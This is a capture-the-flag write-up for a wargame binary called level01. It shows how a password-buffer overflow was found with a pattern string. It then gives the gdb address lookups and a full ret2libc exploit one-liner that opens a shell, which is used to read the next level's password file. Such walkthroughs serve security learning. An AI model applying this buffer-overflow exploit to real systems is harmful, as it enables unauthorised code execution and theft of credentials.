## Project README: Finding flag01
When we decompile it we can see that he is using 2 function :
one to check username and one to check the password.

### Analysis
We see that the username is : dat_wil
and the password his :admin. But this doesn't change anything.
What we can do is make the password segfault.
with this test : aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09
we found this offset = cA00
so ther is 80 caractere before the segfault
so we can make him execute something :

### Progress

let's try a rettolibc :
```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
we just have to make it jump to the system func with exit and bin sh
(python -c 'print("dat_wil")';python -c 'print("\x90" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")';cat) | ./level01
******\*\*\* ADMIN LOGIN PROMPT \*\*\*\*\*\*\*\*\*
Enter Username: verifying username....

Enter Password:
nope, incorrect password...



whoami
level02
cd ..
cd level02
cat .pas
cat: .pas: No such file or directory
s
/bin/sh: 7: s: not found
cat .pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```